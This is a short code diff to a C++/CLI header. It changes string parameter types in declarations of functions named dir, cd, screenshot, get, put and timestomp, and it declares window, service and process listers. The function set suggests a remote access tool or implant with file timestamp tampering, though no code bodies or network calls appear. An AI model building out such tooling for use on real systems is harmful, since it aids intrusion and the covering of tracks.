@@ -17,11 +17,11 @@ using namespace System::Text;
 //System utility functions
 
 int dir(String^ path);
-int cd(LPCTSTR path);
+int cd(String^ path);
 int screenshot();
-int get(LPCTSTR rfile);
-int put(LPCTSTR lfile, LPCTSTR rfile);
-int timestomp(LPCTSTR file);
+int get(String^ rfile);
+int put(String^ lfile, String^ rfile);
+int timestomp(String^ file);
 LPCTSTR* winlist();
 LPCTSTR* servlist();
 LPCSTR* proclist();
